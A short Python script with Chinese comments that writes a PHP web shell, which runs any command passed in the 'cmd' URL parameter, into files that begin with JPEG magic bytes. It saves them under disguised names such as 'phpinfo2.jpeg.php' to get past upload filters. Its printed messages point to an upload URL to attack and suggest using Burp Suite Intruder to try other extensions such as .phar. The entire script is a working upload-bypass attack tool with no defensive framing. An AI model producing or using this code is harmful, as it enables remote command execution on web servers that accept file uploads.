from io import BytesIO

# PHP 内容（phpinfo）
php_content = '''
<?php 
system($_GET["cmd"]);
 ?>
'''

# JPEG 文件的魔术数字（文件头标识）
jpeg_magic_number = b'\xff\xd8\xff\xe0'

# 创建一个包含 PHP 代码且具有 JPEG 魔术数字的 .jpeg 文件的函数
def create_php_to_jpeg_with_magic_number():
    # 创建一个内存中的字节缓冲区
    f = BytesIO()
    
    # 写入 JPEG 文件的魔术数字
    f.write(jpeg_magic_number)
    
    # 将 PHP 内容写入缓冲区
    f.write(php_content.encode('utf-8'))  # 将 PHP 内容转换为字节
    
    # 将缓冲区位置重置为起始位置
    f.seek(0)
    
    return f

# 创建内存中的 PHP .jpeg 文件
php_jpeg_file = create_php_to_jpeg_with_magic_number()

# 保存为 php 扩展名的文件
with open('phpinfo2.jpeg.php', 'wb') as output_file:
    output_file.write(php_jpeg_file.read())

# 重新创建字节缓冲区以保存为 jpeg 扩展名的文件
php_jpeg_file = create_php_to_jpeg_with_magic_number()

# 保存为 .jpeg 扩展名的文件
with open('phpinfo2.jpeg', 'wb') as output_file:
    output_file.write(php_jpeg_file.read())

# 打印信息
print("文件 'phpinfo2.jpeg' 和 'phpinfo2.jpeg.php' 成功创建，内容为 PHP 代码且带有 JPEG 魔术数字！\n")
print("可以使用 http://example.com/uploads/phpinfo2.jpeg.php 进行攻击\n")
print("如果失败，使用 Burp Suite 的 Intruder 工具进行测试，尝试不同的扩展名，例如 phpinfo2.jpeg.phar。\n")
print("通过 Intruder 可以设置 payload 位置并替换文件扩展名，自动化尝试常见漏洞扩展名。\n")
